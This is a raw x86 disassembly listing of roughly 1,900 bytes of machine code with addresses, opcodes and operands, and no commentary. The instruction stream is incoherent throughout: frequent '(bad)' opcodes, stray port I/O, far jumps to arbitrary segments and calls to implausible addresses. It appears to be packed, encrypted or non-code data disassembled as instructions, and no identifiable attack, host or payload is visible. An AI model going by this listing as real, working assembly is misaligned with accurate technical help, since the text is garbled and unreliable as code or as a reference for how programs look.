  40cff4:	vsubss xmm5,xmm7,DWORD PTR [ebx+0x39]
  40cff9:	rcl    BYTE PTR [edx-0x79],1
  40cffc:	fcomi  st,st(1)
  40cffe:	inc    ebp
  40cfff:	inc    ebp
  40d000:	pop    ebx
  40d001:	ffree  st(0)
  40d003:	ins    BYTE PTR es:[edi],dx
  40d004:	sub    DWORD PTR [eax+0x58],esp
  40d007:	outs   dx,BYTE PTR ds:[esi]
  40d008:	arpl   WORD PTR [eax-0x1dfd1f1c],si
  40d00e:	lds    esp,FWORD PTR [eax]
  40d010:	jmp    0x40d03e
  40d012:	in     al,0x1
  40d014:	sbb    DWORD PTR [ebp+0x44],ebp
  40d017:	or     edi,edi
  40d019:	pop    edx
  40d01a:	mov    al,ds:0xe3c36ec9
  40d01f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d020:	jo     0x40d08c
  40d022:	(bad)  
  40d023:	lds    ebp,FWORD PTR [ebp+0xd]
  40d026:	iret   
  40d027:	adc    ch,dh
  40d029:	imul   esp,edx,0xeb73f447
  40d02f:	repnz or BYTE PTR [edi+0x29dc436f],dl
  40d036:	inc    eax
  40d037:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d038:	push   ss
  40d039:	mov    ds:0x9279e8d1,eax
  40d03e:	cmp    eax,0x89c533f1
  40d043:	aad    0x2d
  40d045:	jnp    0x40d068
  40d047:	xor    ecx,DWORD PTR [ebx+0x16d62dc9]
  40d04d:	iret   
  40d04e:	mov    al,0x83
  40d050:	xor    BYTE PTR [ecx+0x28825ce1],dh
  40d056:	imul   esi,esi,0x27ad8f40
  40d05c:	test   ebx,eax
  40d05e:	xchg   edx,eax
  40d05f:	add    eax,0x565d3f22
  40d064:	adc    al,0xd6
  40d066:	sub    bl,BYTE PTR [eax+0x1acbaa80]
  40d06c:	dec    ebx
  40d06d:	nop
  40d06e:	xlat   BYTE PTR ds:[ebx]
  40d06f:	jp     0x40d04a
  40d071:	jo     0x40d06d
  40d073:	stos   DWORD PTR es:[edi],eax
  40d074:	mov    BYTE PTR [edi+0x2d2106f],cl
  40d07a:	cvtps2pi mm1,QWORD PTR ds:0xc0a4ad4c
  40d081:	call   0xd60462ba
  40d086:	xchg   edx,eax
  40d087:	sbb    ebx,DWORD PTR [eax+0x7d74b21f]
  40d08d:	sbb    BYTE PTR [edx+0x598e0a75],bl
  40d093:	loopne 0x40d0b8
  40d095:	or     eax,0x929172df
  40d09a:	shr    dl,0x21
  40d09d:	and    al,BYTE PTR [edi]
  40d09f:	call   DWORD PTR [ebx-0x7ae94a51]
  40d0a5:	(bad)  
  40d0a6:	iret   
  40d0a7:	mov    esp,0x4596fbb0
  40d0ac:	neg    DWORD PTR [esi]
  40d0ae:	mov    ecx,0xada00c4b
  40d0b3:	(bad)  
  40d0b5:	ds std 
  40d0b7:	mov    ch,0x62
  40d0b9:	aas    
  40d0ba:	arpl   WORD PTR [esi-0x759bcae2],bx
  40d0c0:	jns    0x40d04f
  40d0c2:	retf   
  40d0c3:	es shr dl,cl
  40d0c6:	cmp    BYTE PTR [eax-0x7b04bd7a],ch
  40d0cc:	jne    0x40d12f
  40d0ce:	imul   edx,eax,0x78
  40d0d1:	mov    cl,0xba
  40d0d3:	push   esp
  40d0d4:	push   eax
  40d0d5:	lods   eax,DWORD PTR ds:[esi]
  40d0d6:	dec    eax
  40d0d7:	mov    edx,0xb30a5216
  40d0dc:	(bad)  
  40d0de:	jl     0x40d115
  40d0e0:	add    ah,BYTE PTR [ecx+edx*2]
  40d0e3:	bound  edx,QWORD PTR [esi-0x2e98fa86]
  40d0e9:	dec    eax
  40d0ea:	repnz retf 
  40d0ec:	or     ebx,DWORD PTR [edi]
  40d0ee:	enter  0x7f58,0x56
  40d0f2:	inc    ebp
  40d0f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d0f4:	ret    
  40d0f5:	sbb    DWORD PTR [ebp+0x75],0x410908e3
  40d0fc:	pop    es
  40d0fd:	mov    ah,0x10
  40d0ff:	push   ebx
  40d100:	popa   
  40d101:	dec    edi
  40d102:	mov    edi,0xe4fc02a4
  40d107:	jmp    0x5:0x1f718237
  40d10e:	jge    0x40d13f
  40d110:	ds out dx,al
  40d112:	xchg   ebx,eax
  40d113:	cwde   
  40d114:	(bad)
  40d117:	ret    0x77a5
  40d11a:	ja     0x40d107
  40d11c:	xor    BYTE PTR [ebp+0x448d046b],ah
  40d122:	or     esi,esp
  40d124:	lds    edi,FWORD PTR [edi+eax*2+0x6c6ca461]
  40d12b:	leave  
  40d12c:	lods   eax,DWORD PTR ds:[esi]
  40d12d:	mov    ecx,0xb0df9bbe
  40d132:	pushf  
  40d133:	lds    eax,FWORD PTR [edi]
  40d135:	(bad)  
  40d136:	sbb    dh,BYTE PTR [edi-0x29]
  40d139:	or     ah,BYTE PTR [ebx]
  40d13b:	dec    esi
  40d13c:	retf   0x74de
  40d13f:	daa    
  40d140:	fstp   DWORD PTR [ecx+0x56]
  40d143:	lea    esp,[esi]
  40d145:	scas   eax,DWORD PTR es:[edi]
  40d146:	adc    eax,0x25a60f67
  40d14b:	pop    ebp
  40d14c:	fst    QWORD PTR [ebx+0xe]
  40d14f:	icebp  
  40d150:	adc    eax,0xa74d4888
  40d155:	retf   0xbb9f
  40d158:	add    al,0x5c
  40d15a:	scas   eax,DWORD PTR es:[edi]
  40d15b:	mov    ebp,0xcc6449c2
  40d160:	inc    ecx
  40d161:	adc    ecx,DWORD PTR [eax-0x5d]
  40d164:	push   0xffffff91
  40d166:	stos   BYTE PTR es:[edi],al
  40d167:	fwait
  40d168:	cmp    al,0x4f
  40d16a:	jmp    0x40d183
  40d16c:	test   eax,0x6dd59d75
  40d171:	std    
  40d172:	mov    edi,0xb2c7eec1
  40d177:	ror    BYTE PTR [eax],0xb
  40d17a:	imul   eax,DWORD PTR fs:[edx],0x916d021b
  40d181:	stc    
  40d182:	sahf   
  40d183:	dec    edx
  40d184:	jae    0x40d131
  40d186:	ss dec esp
  40d188:	repz cdq 
  40d18a:	lahf   
  40d18b:	repz and DWORD PTR [ebx+ecx*2-0x6baf2a50],0x6b
  40d194:	ja     0x40d1a8
  40d196:	cli    
  40d197:	pop    edi
  40d198:	loopne 0x40d13b
  40d19a:	in     al,0x9d
  40d19c:	and    al,0x34
  40d19e:	shl    BYTE PTR [edi],1
  40d1a0:	outs   dx,DWORD PTR ds:[esi]
  40d1a1:	xor    esp,DWORD PTR [ebx+esi*4]
  40d1a4:	cld    
  40d1a5:	imul   esp,DWORD PTR [edx+0x528232e5],0xf0fa6ce1
  40d1af:	xor    al,0x40
  40d1b1:	rcr    DWORD PTR [ecx+ecx*4],cl
  40d1b4:	repnz loope 0x40d1a1
  40d1b7:	outs   dx,DWORD PTR ds:[esi]
  40d1b8:	push   esi
  40d1b9:	jno    0x40d1b5
  40d1bb:	inc    ecx
  40d1bc:	mov    esp,0x950bca5
  40d1c1:	lods   eax,DWORD PTR ds:[esi]
  40d1c2:	push   ds
  40d1c3:	aad    0x45
  40d1c5:	mov    dh,0xe3
  40d1c7:	dec    ebx
  40d1c8:	int3   
  40d1c9:	xchg   BYTE PTR [ecx+0x8],al
  40d1cc:	or     eax,0xddb77bd0
  40d1d1:	ins    DWORD PTR es:[edi],dx
  40d1d2:	shl    DWORD PTR [edi-0x66e55c77],0x7f
  40d1d9:	std    
  40d1da:	into   
  40d1db:	dec    esp
  40d1dc:	inc    ecx
  40d1dd:	pushf  
  40d1de:	xchg   dl,dl
  40d1e0:	push   cs
  40d1e1:	adc    al,0xe4
  40d1e3:	mov    al,ds:0x4cf1db4a
  40d1e8:	out    0x9b,eax
  40d1ea:	push   0x30
  40d1ec:	adc    esp,DWORD PTR [eax]
  40d1ee:	int    0x9f
  40d1f0:	mov    dh,0x6a
  40d1f2:	xchg   esi,eax
  40d1f3:	mov    edi,0x7b9dc558
  40d1f8:	sbb    BYTE PTR [ebx],bl
  40d1fa:	xchg   edi,eax
  40d1fb:	dec    ebx
  40d1fc:	(bad)
  40d1ff:	sbb    eax,0x735c1c5
  40d204:	bound  eax,QWORD PTR [esi-0x7d89582e]
  40d20a:	pushf  
  40d20b:	aaa    
  40d20c:	mov    al,ds:0xe6c8dd0c
  40d211:	dec    ebx
  40d212:	mov    dh,0xef
  40d214:	inc    edi
  40d215:	jmp    0xa5f5:0xf99bb59b
  40d21c:	mov    ds:0x95e28a48,eax
  40d221:	lds    ecx,FWORD PTR [esi+esi*2+0x1417c124]
  40d228:	mov    ds:0x424b74b3,eax
  40d22d:	out    dx,eax
  40d22e:	lods   al,BYTE PTR ds:[esi]
  40d22f:	jns    0x40d244
  40d231:	xchg   esi,eax
  40d232:	fnstcw WORD PTR [edi+0x66]
  40d235:	xchg   esp,eax
  40d236:	imul   ecx,DWORD PTR [edx+0x35],0xfffffff9
  40d23a:	or     DWORD PTR [ecx+0x4980f6d7],esp
  40d240:	lds    edi,FWORD PTR [esi-0x3f]
  40d243:	test   al,0xa7
  40d245:	loope  0x40d2b3
  40d247:	push   cs
  40d248:	call   0x5861:0xef7fd77
  40d24f:	mov    ebp,DWORD PTR [edi+0x57]
  40d252:	retf   
  40d253:	(bad)  
  40d255:	and    bl,dl
  40d257:	cmc    
  40d258:	out    0xa8,eax
  40d25a:	inc    eax
  40d25b:	cmc    
  40d25c:	mov    edi,0x67f7af61
  40d261:	lods   al,BYTE PTR ds:[esi]
  40d262:	test   BYTE PTR [edx],ah
  40d264:	std    
  40d265:	jne    0x40d2d3
  40d267:	xor    dh,dh
  40d269:	or     dl,0xb0
  40d26c:	xchg   esp,esp
  40d26e:	mov    eax,ds:0xea6e690f
  40d273:	jo     0x40d2b3
  40d275:	add    BYTE PTR [ecx+0x65],ch
  40d278:	mov    edi,0x9f4c6261
  40d27d:	xor    al,0xf
  40d27f:	mov    cl,0x8e
  40d281:	mov    ebp,0x2e74b147
  40d286:	and    BYTE PTR [eax],dl
  40d288:	jne    0x40d2cb
  40d28a:	mov    edi,0x15cf5635
  40d28f:	cli    
  40d290:	adc    DWORD PTR [edx+ebp*1+0x283522c8],0x5f
  40d298:	loope  0x40d316
  40d29a:	stos   DWORD PTR es:[edi],eax
  40d29b:	mov    eax,ds:0x78892ef
  40d2a0:	add    DWORD PTR [ecx+0x1a],0xffffffdb
  40d2a4:	enter  0x8366,0x89
  40d2a8:	jae    0x40d2f1
  40d2aa:	int    0xf6
  40d2ac:	shr    bl,1
  40d2ae:	sbb    edi,ecx
  40d2b0:	xor    BYTE PTR [eax+0x5b78bc30],0x14
  40d2b7:	cmp    bh,BYTE PTR [esi+0x47ff095d]
  40d2bd:	add    BYTE PTR [ecx+0x25],0x65
  40d2c1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d2c2:	fild   QWORD PTR [esi]
  40d2c4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d2c5:	mov    bh,0xd4
  40d2c7:	mov    cl,0xfd
  40d2c9:	mov    ebx,0x3dd1f0bb
  40d2ce:	cmp    BYTE PTR [bx+di+0x72c3],0x35
  40d2d4:	pop    ebp
  40d2d5:	pop    edx
  40d2d6:	mov    al,0x74
  40d2d8:	sub    DWORD PTR [eax+0x3],ebx
  40d2db:	inc    ecx
  40d2dc:	mov    esi,0xde7ee3fa
  40d2e1:	in     eax,dx
  40d2e2:	cwde   
  40d2e3:	(bad)  
  40d2e5:	xor    al,0x8a
  40d2e7:	xor    al,0xaa
  40d2e9:	or     ecx,esi
  40d2eb:	arpl   WORD PTR [eax],sp
  40d2ed:	ficom  WORD PTR ds:0x961c6448
  40d2f3:	fsubr  DWORD PTR [ebx+ecx*8+0x48]
  40d2f7:	dec    edi
  40d2f8:	cmp    DWORD PTR [eax+ecx*1+0x72],ebx
  40d2fc:	repz dec edx
  40d2fe:	(bad)  
  40d2ff:	jae    0x40d327
  40d301:	stos   DWORD PTR es:[edi],eax
  40d302:	and    eax,0x8666914
  40d307:	jp     0x40d2af
  40d309:	jmp    0x40d2de
  40d30b:	clc    
  40d30c:	dec    ebx
  40d30d:	jp     0x40d374
  40d30f:	dec    ebp
  40d310:	or     ah,BYTE PTR [ecx+0x4a]
  40d313:	push   0x604c6a95
  40d318:	add    al,0x7a
  40d31a:	int    0x26
  40d31c:	fcom   QWORD PTR [eax]
  40d31e:	mov    ds,WORD PTR [eax]
  40d320:	mov    al,ds:0x5a867e3
  40d326:	cmc    
  40d327:	jns    0x40d314
  40d329:	pop    ebx
  40d32a:	popa   
  40d32b:	ins    DWORD PTR es:[edi],dx
  40d32c:	lods   al,BYTE PTR ds:[esi]
  40d32d:	test   DWORD PTR [eax+0x5b2d45e4],ecx
  40d333:	sbb    sp,WORD PTR [ecx+0x5aaa5583]
  40d33a:	test   eax,0xdf66a91d
  40d33f:	dec    ebx
  40d340:	outs   dx,DWORD PTR ds:[esi]
  40d341:	int3   
  40d342:	jl     0x40d3b1
  40d344:	loopne 0x40d32c
  40d346:	dec    eax
  40d347:	and    dh,BYTE PTR [eax]
  40d349:	mov    al,0xd7
  40d34b:	js     0x40d388
  40d34d:	mov    al,0xa7
  40d34f:	xor    edi,DWORD PTR [ebp+0xc69e890]
  40d355:	pushf  
  40d356:	daa    
  40d357:	dec    esp
  40d358:	inc    esi
  40d359:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d35a:	jnp    0x40d316
  40d35c:	jg     0x40d321
  40d35e:	push   0x32
  40d360:	pop    edi
  40d361:	jecxz  0x40d3e1
  40d363:	dec    edi
  40d364:	shr    bh,0xe
  40d367:	push   es
  40d368:	xchg   edx,eax
  40d369:	sbb    esi,edx
  40d36b:	dec    ecx
  40d36c:	aad    0x6c
  40d36e:	jo     0x40d3a0
  40d370:	pusha  
  40d371:	rcr    DWORD PTR [ebx-0x52a93686],1
  40d377:	push   ecx
  40d378:	inc    ecx
  40d379:	xchg   DWORD PTR [edx-0x1829a361],edi
  40d37f:	jge    0x40d329
  40d381:	lock cli 
  40d383:	imul   esi,DWORD PTR [edx],0x71
  40d386:	es fwait
  40d388:	inc    edx
  40d389:	and    eax,0xadef6fe8
  40d38e:	pop    ecx
  40d38f:	test   BYTE PTR [edx-0x6e],bl
  40d392:	fwait
  40d393:	retf   
  40d394:	icebp  
  40d395:	fnstcw WORD PTR [ecx+ecx*2]
  40d398:	je     0x40d381
  40d39a:	in     eax,0x35
  40d39c:	xchg   edx,eax
  40d39d:	pop    ebp
  40d39e:	mov    esi,0x2dea6322
  40d3a3:	(bad)  
  40d3a4:	clc    
  40d3a5:	xchg   edx,eax
  40d3a6:	js     0x40d378
  40d3a8:	(bad)  
  40d3a9:	scas   eax,DWORD PTR es:[edi]
  40d3aa:	push   ebp
  40d3ab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d3ac:	or     al,BYTE PTR [edi+0x3f]
  40d3af:	jmp    0x1303:0xe3231dd8
  40d3b6:	cmp    BYTE PTR [edx+0x1247a38c],cl
  40d3bc:	lods   eax,DWORD PTR ds:[esi]
  40d3bd:	cmp    DWORD PTR [ebp+0x13],esi
  40d3c0:	iret   
  40d3c1:	gs stos BYTE PTR es:[edi],al
  40d3c3:	lods   al,BYTE PTR ds:[esi]
  40d3c4:	push   eax
  40d3c5:	mov    eax,ds:0xe7c471f
  40d3ca:	test   BYTE PTR [esi],bl
  40d3cc:	ss mov edi,?
  40d3cf:	mov    bl,0x85
  40d3d1:	add    al,0xa9
  40d3d3:	fs mov ch,0xc6
  40d3d6:	adc    eax,0x4a9b4271
  40d3db:	fnstcw WORD PTR [edx]
  40d3dd:	lock adc edi,eax
  40d3e0:	dec    esi
  40d3e1:	inc    esp
  40d3e2:	pop    ecx
  40d3e3:	mov    al,0xc
  40d3e5:	add    eax,0x30655cc1
  40d3ea:	sbb    al,0x2
  40d3ec:	sub    dh,BYTE PTR [edi]
  40d3ee:	stos   BYTE PTR es:[edi],al
  40d3ef:	daa    
  40d3f0:	pop    edi
  40d3f1:	mov    DWORD PTR [ecx-0x49],0x44f889f9
  40d3f8:	cmp    bl,BYTE PTR [eax+0x2b0d8d44]
  40d3fe:	xchg   ebp,eax
  40d3ff:	cld    
  40d400:	fldenv [eax+ebx*2]
  40d403:	jmp    0x40d461
  40d405:	pop    edi
  40d406:	mov    edi,0x6fd115ba
  40d40b:	fst    st(0)
  40d40d:	in     al,dx
  40d40e:	imul   ebx,DWORD PTR [ecx+0x7b],0xba68161c
  40d415:	nop
  40d416:	(bad)  
  40d417:	(bad)  
  40d418:	mov    bl,0x48
  40d41a:	sbb    DWORD PTR [edi],ecx
  40d41c:	pusha  
  40d41d:	stos   BYTE PTR es:[edi],al
  40d41e:	inc    esi
  40d41f:	mov    bl,0x9f
  40d421:	hlt    
  40d422:	js     0x40d475
  40d424:	mov    bh,0x41
  40d426:	add    eax,0x6dd016c4
  40d42b:	scas   eax,DWORD PTR es:[edi]
  40d42c:	mov    ecx,0x625f66d9
  40d431:	push   ebp
  40d432:	or     DWORD PTR [edi-0x33eafe8],edi
  40d438:	inc    ecx
  40d439:	repnz pop esi
  40d43b:	pop    es
  40d43c:	sbb    al,0x31
  40d43e:	and    esp,DWORD PTR [edi]
  40d440:	add    BYTE PTR [eax+ebx*4-0x7ef9212b],ah
  40d447:	popf   
  40d448:	popa   
  40d449:	bound  ecx,QWORD PTR [esi]
  40d44b:	inc    esi
  40d44c:	fimul  DWORD PTR [edx+0x62]
  40d44f:	xchg   BYTE PTR [edi],cl
  40d451:	(bad)  
  40d452:	addr16 jne 0x40d46f
  40d455:	mov    ch,0xd1
  40d457:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d458:	xchg   ebx,eax
  40d459:	(bad)  
  40d45a:	mov    edx,0x3134622d
  40d45f:	jne    0x40d444
  40d461:	into   
  40d462:	(bad)  
  40d463:	jae    0x40d435
  40d465:	push   0x23d0f748
  40d46a:	ret    0xcf33
  40d46d:	mov    DWORD PTR [ebp-0x4],eax
  40d470:	jmp    0x40d9fa
  40d475:	mov    ds:0x60bf5ac5,eax
  40d47a:	sbb    BYTE PTR [edx],ah
  40d47c:	cdq    
  40d47d:	cmovbe edx,DWORD PTR [edx+esi*4-0x59]
  40d482:	dec    edx
  40d483:	mov    WORD PTR [esi-0x29],gs
  40d486:	mov    ah,0x16
  40d488:	push   ss
  40d489:	cmp    eax,0x13161604
  40d48e:	jecxz  0x40d4dc
  40d490:	fisttp WORD PTR ss:[ebp+0x49a08969]
  40d497:	(bad)  
  40d498:	popf   
  40d499:	add    ah,bl
  40d49b:	fs mov esp,0xf767dd5e
  40d4a1:	in     al,dx
  40d4a2:	iret   
  40d4a3:	jge    0x40d491
  40d4a5:	pop    edx
  40d4a6:	int    0x99
  40d4a8:	popf   
  40d4a9:	mov    ecx,0x61050300
  40d4ae:	xchg   edi,eax
  40d4af:	adc    ebp,DWORD PTR [eax]
  40d4b1:	mov    ah,0x9e
  40d4b3:	mov    ch,0x36
  40d4b5:	in     al,dx
  40d4b6:	cmp    ah,BYTE PTR [ebp+0x42205aa2]
  40d4bc:	ja     0x40d465
  40d4be:	retf   0xbc5
  40d4c1:	jg     0x40d451
  40d4c3:	add    eax,0x3e3ea307
  40d4c8:	mov    ch,0x1c
  40d4ca:	xor    bh,cl
  40d4cc:	jb     0x40d4c0
  40d4ce:	dec    esp
  40d4cf:	(bad)  
  40d4d0:	not    DWORD PTR [ebp+0x749a416b]
  40d4d6:	mov    esi,0x1d99afd0
  40d4db:	or     bl,dh
  40d4dd:	js     0x40d54c
  40d4df:	icebp  
  40d4e0:	inc    eax
  40d4e1:	jge    0x40d4ab
  40d4e3:	shl    DWORD PTR [esi],1
  40d4e5:	gs xor eax,0x19f9283f
  40d4eb:	fild   QWORD PTR ss:[ecx+0x23]
  40d4ef:	pop    edx
  40d4f0:	push   DWORD PTR [edx]
  40d4f2:	in     al,0x33
  40d4f4:	push   ebx
  40d4f5:	int3   
  40d4f6:	push   ecx
  40d4f7:	or     al,0x32
  40d4f9:	sbb    cl,dl
  40d4fb:	iret   
  40d4fc:	cs xchg esi,eax
  40d4fe:	ret    
  40d4ff:	mov    bl,0x4f
  40d501:	push   cs
  40d502:	sar    DWORD PTR ds:0xaf13d57b,1
  40d508:	xchg   ah,cl
  40d50a:	or     al,0x5d
  40d50c:	test   DWORD PTR [ebp*2+0x14613201],ebx
  40d513:	loop   0x40d497
  40d515:	les    ebp,FWORD PTR [esi]
  40d517:	dec    esp
  40d518:	gs jo  0x40d56e
  40d51b:	(bad)  
  40d51c:	inc    eax
  40d51d:	mov    dl,0x2
  40d51f:	fidivr DWORD PTR [esi+0x11]
  40d522:	(bad)  
  40d523:	loop   0x40d531
  40d525:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d526:	mov    edx,0xb24fca62
  40d52b:	repz sbb eax,ecx
  40d52e:	xchg   edx,eax
  40d52f:	mov    WORD PTR [edx],?
  40d531:	and    al,0xe4
  40d533:	rcl    DWORD PTR [esi-0x44019bee],0x4b
  40d53a:	dec    ecx
  40d53b:	pop    esp
  40d53c:	xor    BYTE PTR ds:0x190a6818,0x45
  40d543:	mov    dl,0x4b
  40d545:	dec    ebp
  40d546:	dec    esp
  40d547:	push   edx
  40d548:	sub    al,0x79
  40d54a:	jmp    0x4bba:0xad5fa529
  40d551:	les    edi,FWORD PTR [eax+0x2b620693]
  40d557:	fsub   QWORD PTR [ebp+edx*4+0x43]
  40d55b:	mov    edi,0xf380b0f6
  40d560:	sub    esp,DWORD PTR [edx-0x1a46d293]
  40d566:	das    
  40d567:	push   edi
  40d568:	push   ss
  40d569:	out    dx,al
  40d56a:	sbb    al,0x7a
  40d56c:	adc    eax,0xef825e17
  40d571:	test   BYTE PTR [eax+0xbbe094f],0x31
  40d578:	lds    esp,FWORD PTR [esi+0x61f8880d]
  40d57e:	sti    
  40d57f:	add    ebx,DWORD PTR [ecx]
  40d581:	cmp    edx,DWORD PTR [edi-0x24565621]
  40d587:	retf   0xffe8
  40d58a:	sbb    BYTE PTR ds:0xab9c97ee,0xe1
  40d591:	cmp    BYTE PTR [eax-0x2b],al
  40d594:	jbe    0x40d5a8
  40d596:	push   0x66
  40d598:	sbb    eax,0x4bc536f6
  40d59d:	inc    ebx
  40d59e:	or     bh,al
  40d5a0:	jae    0x40d544
  40d5a2:	adc    BYTE PTR [ebx+ecx*8+0x5eccf56a],0x99
  40d5aa:	push   esi
  40d5ab:	(bad)  
  40d5ad:	adc    ebx,0x54d6e247
  40d5b3:	jle    0x40d5d8
  40d5b5:	sub    BYTE PTR [esi],ch
  40d5b7:	test   al,0x53
  40d5b9:	mov    edi,0xa211cd1c
  40d5be:	jmp    DWORD PTR [eax+0x46a7fb79]
  40d5c4:	xchg   BYTE PTR [ebp-0x46],al
  40d5c7:	ret    
  40d5c8:	popa   
  40d5c9:	jmp    0x2876:0xe8c308a
  40d5d0:	aad    0x4
  40d5d2:	and    eax,0xc0723d29
  40d5d7:	xchg   ebp,eax
  40d5d8:	xchg   esp,eax
  40d5d9:	bnd jmp 0x12d72e74
  40d5df:	out    dx,eax
  40d5e0:	cmp    DWORD PTR [ecx+eax*4-0x74ae0ad7],esp
  40d5e7:	cmc    
  40d5e8:	mov    ecx,0xaa757f6
  40d5ed:	retf   
  40d5ee:	jg     0x40d5ac
  40d5f0:	je     0x40d5c3
  40d5f2:	inc    esp
  40d5f3:	test   eax,0x107d9c97
  40d5f8:	and    BYTE PTR [ecx],al
  40d5fa:	(bad)  
  40d5fb:	lods   eax,DWORD PTR ds:[esi]
  40d5fc:	enter  0x8400,0x9c
  40d600:	jl     0x40d663
  40d602:	and    BYTE PTR [ecx],dl
  40d604:	(bad)  
  40d606:	das    
  40d607:	stc    
  40d608:	dec    edx
  40d609:	pop    edx
  40d60a:	es sub edx,eax
  40d60d:	mov    edx,0xe9550235
  40d612:	fs xchg edi,eax
  40d614:	sub    al,0x29
  40d616:	jmp    0x5398:0x5f2a3a42
  40d61d:	addr16 mov edi,0xde312f9
  40d623:	aam    0x0
  40d625:	push   0x3bb86781
  40d62a:	cmp    eax,0x4c96d16b
  40d62f:	loop   0x40d602
  40d631:	xor    dl,ch
  40d633:	mov    dl,0x36
  40d635:	and    al,0x3a
  40d637:	or     al,0xe5
  40d639:	push   ebx
  40d63a:	or     dh,BYTE PTR [edx-0x45]
  40d63d:	ja     0x40d5c0
  40d63f:	in     eax,dx
  40d640:	bound  edi,QWORD PTR [ecx-0x640de04a]
  40d646:	fcmovnb st,st(0)
  40d648:	push   edi
  40d649:	icebp  
  40d64a:	jge    0x40d5fb
  40d64c:	or     DWORD PTR [edx+0x1b],0xffffffd4
  40d650:	in     eax,0xf0
  40d652:	(bad)  
  40d653:	sub    eax,ecx
  40d655:	inc    ebx
  40d656:	mov    ebx,0x921552cf
  40d65b:	punpcklwd mm7,DWORD PTR [ecx-0x609bb00b]
  40d662:	jns    0x40d667
  40d664:	test   eax,0x8ccc3c43
  40d669:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d66a:	out    0xa5,al
  40d66c:	cmp    al,0xbb
  40d66e:	cs jmp 0xd0fcf6e9
  40d674:	jecxz  0x40d60b
  40d676:	pop    ebx
  40d677:	outs   dx,DWORD PTR ds:[esi]
  40d678:	sbb    BYTE PTR [eax-0x5e],dh
  40d67b:	and    al,0xbe
  40d67d:	fdiv   DWORD PTR [ecx]
  40d67f:	(bad)  
  40d680:	xor    DWORD PTR [edx-0x66],ebx
  40d683:	call   0x8050fba9
  40d688:	mov    ah,0x72
  40d68a:	push   ds
  40d68b:	jl     0x40d616
  40d68d:	dec    esi
  40d68e:	sahf   
  40d68f:	jmp    0xee7d:0xf7cd1799
  40d696:	pop    ebx
  40d697:	adc    eax,0x7965b9f
  40d69c:	(bad)  
  40d69d:	fadd   DWORD PTR [edx]
  40d69f:	xchg   esi,eax
  40d6a0:	iret   
  40d6a1:	mov    esp,0x564f8c00
  40d6a6:	out    0x37,al
  40d6a8:	sub    DWORD PTR [edx+0x3a],esp
  40d6ab:	bnd jge 0x40d653
  40d6ae:	rcl    BYTE PTR [esi-0x56a13b9a],0x4e
  40d6b5:	dec    esp
  40d6b6:	mov    ecx,0x13aa8ed8
  40d6bb:	(bad)  
  40d6bd:	or     BYTE PTR [ecx-0x6d],dh
  40d6c0:	enter  0xdb02,0x1a
  40d6c4:	push   cs
  40d6c5:	xchg   ebp,eax
  40d6c6:	ficom  DWORD PTR [esi+0x5a9fa8f3]
  40d6cc:	pop    ebx
  40d6cd:	mov    ch,0x7e
  40d6cf:	das    
  40d6d0:	das    
  40d6d1:	xchg   edi,eax
  40d6d2:	fucomp st(0)
  40d6d4:	test   al,0xa
  40d6d6:	cmp    eax,0x9250b008
  40d6db:	pop    dx
  40d6dd:	test   BYTE PTR [edx+ecx*4-0xa75a706],0x77
  40d6e5:	cdq    
  40d6e6:	mov    ah,0xff
  40d6e8:	shl    DWORD PTR [edi+eiz*1-0x1a882db6],cl
  40d6ef:	mov    bl,0xf8
  40d6f1:	inc    esp
  40d6f2:	lods   al,BYTE PTR ds:[esi]
  40d6f3:	push   cs
  40d6f4:	(bad)  
  40d6f5:	jle    0x40d6b4
  40d6f7:	push   ss
  40d6f8:	or     eax,0xb9271eaf
  40d6fd:	cmp    eax,DWORD PTR [eax-0x23ca6fa0]
  40d703:	lock pushf 
  40d705:	cmp    eax,0x5512f43c
  40d70a:	loope  0x40d76c
  40d70c:	xchg   esp,eax
  40d70d:	cmpxchg BYTE PTR [eax+edi*2-0x4a],bh
  40d712:	stc    
  40d713:	and    al,0x7b
  40d715:	sbb    edx,ebx
  40d717:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d718:	xor    BYTE PTR [ecx+ebp*8],al
  40d71b:	jbe    0x40d737
  40d71d:	jns    0x40d6e2
  40d71f:	(bad)  
  40d720:	fisttp QWORD PTR [ecx-0x44dd6c98]
  40d726:	push   edx
  40d727:	inc    edx
  40d728:	(bad)  
  40d729:	cld    
  40d72a:	xchg   ecx,eax
  40d72b:	sub    BYTE PTR [ebx],cl
  40d72d:	jle    0x40d6d2
  40d72f:	sbb    al,0x4b
  40d731:	popa   
  40d732:	mov    ds:0x8b0f6061,eax
  40d737:	in     al,0xa7
  40d739:	xor    al,0x2b
  40d73b:	pop    esp
  40d73c:	dec    ebx
  40d73d:	sub    eax,0xb83c105b
  40d742:	push   ecx
  40d743:	(bad)  
  40d744:	xchg   edx,eax
  40d745:	dec    edi
  40d746:	mov    ah,0xbf
  40d748:	dec    edi
  40d749:	push   ecx
  40d74a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d74b:	and    DWORD PTR [eax-0x32],eax
  40d74e:	mov    al,0x2d
  40d750:	inc    esi
  40d751:	mov    BYTE PTR [esp+eax*8],al
  40d754:	mov    BYTE PTR [edx],dh
  40d756:	sub    eax,0xc1f7d1e8
  40d75b:	rol    ebx,cl
  40d75d:	mov    cl,0x3a
  40d75f:	or     al,0x2c
  40d761:	test   bl,al
  40d763:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d764:	cli    
  40d765:	inc    ecx
  40d766:	pusha  
  40d767:	pop    ebp
  40d768:	lds    esi,FWORD PTR ds:[esi+0x781d6ffb]
  40d76f:	or     bh,dl
  40d771:	ror    DWORD PTR ds:0xdd32e525,1
  40d777:	adc    BYTE PTR [ebx+0x5d],0x4f
  40d77b:	dec    ebp
  40d77c:	sbb    edx,ebp
  40d77e:	inc    ecx
  40d77f:	sar    DWORD PTR [eax+0x7b],cl
  40d782:	enter  0xd89f,0x26
  40d786:	(bad)  
  40d787:	jmp    0x40d742
  40d789:	cs call 0x21575944
  40d78f:	dec    ebx
